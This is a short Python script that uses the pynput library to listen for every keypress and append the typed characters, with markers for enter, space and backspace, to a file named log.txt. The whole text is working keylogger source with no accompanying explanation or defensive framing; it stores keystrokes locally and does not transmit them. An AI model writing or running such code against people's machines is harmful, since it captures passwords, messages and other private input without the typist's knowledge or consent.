from pynput.keyboard import Listener, Key

def writefile(key):
    with open("log.txt", "a") as file:
        if key == Key.enter:
            file.write('\n')
        elif key == Key.space:
            file.write(' ')
        elif key == Key.backspace:
            file.write(' [BACKSPACE] ')
        elif hasattr(key, 'char') and key.char is not None:
            file.write(key.char)

with Listener(on_press=writefile) as listener:
    listener.join()